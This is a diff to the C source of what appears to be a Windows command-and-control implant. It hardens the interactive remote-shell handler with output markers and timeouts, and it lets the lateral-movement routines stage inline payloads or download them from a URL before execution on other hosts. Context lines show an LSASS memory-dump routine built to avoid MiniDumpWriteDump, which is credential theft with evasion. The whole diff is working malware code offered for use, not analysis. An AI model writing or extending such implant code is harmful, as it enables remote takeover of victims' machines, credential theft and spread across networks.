@@ -617,6 +617,65 @@ static void json_get_str(const char *json, const char *key, char *out, size_t ou
     out[i] = '\0';
 }
 
+/* ISHELL_RUN is normally sent as raw command text.  Keep accepting the
+ * object form used by older callers so the agent remains wire-compatible. */
+static void ishell_get_command(const char *args, char *out, size_t out_sz) {
+    if (!out || out_sz == 0) return;
+    out[0] = '\0';
+    if (!args) return;
+
+    const char *p = args;
+    while (*p && isspace((unsigned char)*p)) p++;
+    if (*p == '{' && strstr(p, "\"cmd\"") != NULL) {
+        json_get_str(p, "cmd", out, out_sz, "");
+    } else {
+        strncpy(out, p, out_sz - 1);
+        out[out_sz - 1] = '\0';
+    }
+
+    size_t n = strlen(out);
+    while (n > 0 && (out[n - 1] == '\r' || out[n - 1] == '\n'))
+        out[--n] = '\0';
+}
+
+/* Accept both the current JSON form ({"shell":"ps"}) and the legacy
+ * plain-text form ("ps") used by older operators. */
+static void ishell_get_shell(const char *args, char *out, size_t out_sz) {
+    if (!out || out_sz == 0) return;
+    out[0] = '\0';
+    if (!args) return;
+    const char *p = args;
+    while (*p && isspace((unsigned char)*p)) p++;
+    if (*p == '{') json_get_str(p, "shell", out, out_sz, "cmd");
+    else {
+        strncpy(out, p, out_sz - 1);
+        out[out_sz - 1] = '\0';
+    }
+    size_t n = strlen(out);
+    while (n > 0 && isspace((unsigned char)out[n - 1])) out[--n] = '\0';
+    if (!out[0]) strncpy(out, "cmd", out_sz - 1);
+}
+
+/* Drain all currently available bytes without blocking on an interactive
+ * command that is waiting for more input. */
+static int ishell_drain_pipe(HANDLE pipe, char *buf, size_t cap, size_t *len) {
+    int read_any = 0;
+    while (*len + 1 < cap) {
+        DWORD available = 0;
+        if (!PeekNamedPipe(pipe, NULL, 0, NULL, &available, NULL)) return -1;
+        if (available == 0) break;
+
+        DWORD want = available;
+        if ((size_t)want > cap - *len - 1) want = (DWORD)(cap - *len - 1);
+        DWORD got = 0;
+        if (!ReadFile(pipe, buf + *len, want, &got, NULL) || got == 0) return -1;
+        *len += (size_t)got;
+        buf[*len] = '\0';
+        read_any = 1;
+    }
+    return read_any;
+}
+
 // ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────
 // Builds a minimal valid MDMP via NtReadVirtualMemory; no MiniDumpWriteDump call.
 // Returns heap-allocated buffer (caller must free) or NULL on failure.
@@ -3273,7 +3332,7 @@ void dispatch_task(AgentTask *task) {
             agent_send_result(task->id,"","ISHELL already open; run ISHELL_CLOSE first"); return;
         }
         char shell_name[64] = {0};
-        json_get_str(args,"shell",shell_name,sizeof(shell_name),"cmd");
+        ishell_get_shell(args, shell_name, sizeof(shell_name));
         char shell_cmd[256];
         if (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
             strncpy(shell_cmd,"powershell.exe",sizeof(shell_cmd)-1);
@@ -3370,26 +3429,63 @@ void dispatch_task(AgentTask *task) {
     else if (strcmp(type_upper, "ISHELL_RUN") == 0) {
         if (!g_ishell_proc) { agent_send_result(task->id,"","no active ishell; run ISHELL_OPEN first"); return; }
         char ish_cmd[4096] = {0};
-        json_get_str(args,"cmd",ish_cmd,sizeof(ish_cmd)-3,"");
-        size_t clen = strlen(ish_cmd);
-        ish_cmd[clen++] = '\r'; ish_cmd[clen++] = '\n'; ish_cmd[clen] = '\0';
+        ishell_get_command(args, ish_cmd, sizeof(ish_cmd) - 96);
+
+        char marker[64] = {0};
+        snprintf(marker, sizeof(marker), "__SHLEOF__%lu_%lu",
+                 (unsigned long)GetCurrentProcessId(),
+                 (unsigned long)GetTickCount());
+        char input[4096 + 96] = {0};
+        int input_len = snprintf(input, sizeof(input), "%s\r\necho %s\r\n",
+                                 ish_cmd, marker);
+        if (input_len < 0 || (size_t)input_len >= sizeof(input)) {
+            agent_send_result(task->id, "", "ishell command too long"); return;
+        }
+
         DWORD written2 = 0;
-        WriteFile(g_ishell_stdin_w,ish_cmd,(DWORD)clen,&written2,NULL);
-        Sleep(750);
+        if (!WriteFile(g_ishell_stdin_w, input, (DWORD)input_len, &written2, NULL) ||
+            written2 != (DWORD)input_len) {
+            char e[96];
+            snprintf(e, sizeof(e), "ishell stdin write failed (%lu)",
+                     (unsigned long)GetLastError());
+            agent_send_result(task->id, "", e); return;
+        }
+
         char *ish_out = (char*)malloc(65536);
         if (!ish_out) { agent_send_result(task->id,"","oom"); return; }
-        int ish_len = 0;
-        DWORD avail2 = 0;
-        while (ish_len < 65534 &&
-               PeekNamedPipe(g_ishell_stdout_r,NULL,0,NULL,&avail2,NULL) && avail2 > 0) {
-            DWORD to_rd = avail2 < (DWORD)(65534-ish_len) ? avail2 : (DWORD)(65534-ish_len);
-            DWORD actually_rd = 0;
-            if (!ReadFile(g_ishell_stdout_r,ish_out+ish_len,to_rd,&actually_rd,NULL)) break;
-            ish_len += (int)actually_rd;
-            avail2 = 0;
+        size_t ish_len = 0;
+        int pipe_closed = 0;
+        int marker_found = 0;
+        ULONGLONG deadline = GetTickCount64() + 30000ULL;
+        while (GetTickCount64() < deadline && ish_len + 1 < 65536) {
+            int drain = ishell_drain_pipe(g_ishell_stdout_r, ish_out, 65536, &ish_len);
+            if (drain < 0) { pipe_closed = 1; break; }
+            if (strstr(ish_out, marker) != NULL) {
+                marker_found = 1;
+                break;
+            }
+
+            DWORD exit_code = STILL_ACTIVE;
+            if (!GetExitCodeProcess(g_ishell_proc, &exit_code) ||
+                exit_code != STILL_ACTIVE) {
+                pipe_closed = 1;
+                break;
+            }
+            Sleep(50);
         }
+
         ish_out[ish_len] = '\0';
-        agent_send_result(task->id,ish_out,""); free(ish_out);
+        char *marker_pos = strstr(ish_out, marker);
+        if (marker_pos) *marker_pos = '\0';
+        char ish_err[128] = {0};
+        if (!marker_found) {
+            if (pipe_closed)
+                snprintf(ish_err, sizeof(ish_err), "ishell closed before command completed");
+            else
+                snprintf(ish_err, sizeof(ish_err), "ishell timeout waiting for command output");
+        }
+        agent_send_result(task->id, ish_out, ish_err);
+        free(ish_out);
     }
     else if (strcmp(type_upper, "ISHELL_CLOSE") == 0) {
         if (!g_ishell_proc) { agent_send_result(task->id,"","no active ishell"); return; }
@@ -3673,16 +3769,28 @@ void dispatch_task(AgentTask *task) {
                 GetModuleFileNameA(NULL, lat_cmd, (DWORD)sizeof(lat_cmd));
             } else {
                 size_t pl_len=0;
-                uint8_t *pl_data=agent_download_file(lat_payload,&pl_len);
+                uint8_t *pl_data = NULL;
+                int pl_owned = 0;
+                if (task->payload && task->payload_len) {
+                    pl_data = task->payload;
+                    pl_len = task->payload_len;
+                } else {
+                    pl_data = agent_download_file(lat_payload, &pl_len);
+                    pl_owned = 1;
+                }
                 if (!pl_data||pl_len==0) {
-                    free(pl_data);
+                    if (pl_owned) free(pl_data);
                     agent_send_result(task->id,"","LATERAL: payload download failed"); return;
                 }
                 const char *tmp=getenv("TEMP"); if(!tmp)tmp="C:\\Windows\\Temp";
                 snprintf(lat_cmd,sizeof(lat_cmd),"%s\\%s",tmp,lat_payload);
                 FILE *pf=fopen(lat_cmd,"wb");
-                if(pf){fwrite(pl_data,1,pl_len,pf);fclose(pf);}
-                free(pl_data);
+                if (!pf) {
+                    if (pl_owned) free(pl_data);
+                    agent_send_result(task->id,"","LATERAL: cannot stage inline payload"); return;
+                }
+                fwrite(pl_data,1,pl_len,pf); fclose(pf);
+                if (pl_owned) free(pl_data);
             }
         }
         if (!lat_host[0]) { agent_send_result(task->id,"","LATERAL: host required"); return; }
@@ -3733,7 +3841,7 @@ void dispatch_task(AgentTask *task) {
             /* Load payload — prefer lat_payload URL, fall back to lat_cmd path */
             uint8_t *payload_data = NULL;
             size_t payload_len = 0;
-            if (lat_payload[0])
+            if (!lat_cmd[0] && lat_payload[0])
                 payload_data = agent_download_file(lat_payload, &payload_len);
             if (!payload_data || !payload_len) {
                 free(payload_data); payload_data = NULL;
@@ -3873,7 +3981,7 @@ void dispatch_task(AgentTask *task) {
             snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
 
             uint8_t *payload_data = NULL; size_t payload_len = 0;
-            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
             if (!payload_data || !payload_len) {
                 free(payload_data); payload_data = NULL;
                 if (lat_cmd[0]) {
@@ -3920,7 +4028,7 @@ void dispatch_task(AgentTask *task) {
             snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
 
             uint8_t *payload_data = NULL; size_t payload_len = 0;
-            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
             if (!payload_data || !payload_len) {
                 free(payload_data); payload_data = NULL;
                 if (lat_cmd[0]) {
@@ -3979,7 +4087,7 @@ void dispatch_task(AgentTask *task) {
             snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
 
             uint8_t *payload_data = NULL; size_t payload_len = 0;
-            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
             if (!payload_data || !payload_len) {
                 free(payload_data); payload_data = NULL;
                 if (lat_cmd[0]) {
@@ -4020,7 +4128,7 @@ void dispatch_task(AgentTask *task) {
             snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
 
             uint8_t *payload_data = NULL; size_t payload_len = 0;
-            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
             if (!payload_data || !payload_len) {
                 free(payload_data); payload_data = NULL;
                 if (lat_cmd[0]) {
@@ -4083,7 +4191,7 @@ void dispatch_task(AgentTask *task) {
             snprintf(tmp_path, sizeof(tmp_path), "%s\\%s", tmp_env, exe_name);
 
             uint8_t *payload_data = NULL; size_t payload_len = 0;
-            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!lat_cmd[0] && lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
             if (!payload_data || !payload_len) {
                 free(payload_data); payload_data = NULL;
                 if (lat_cmd[0]) {
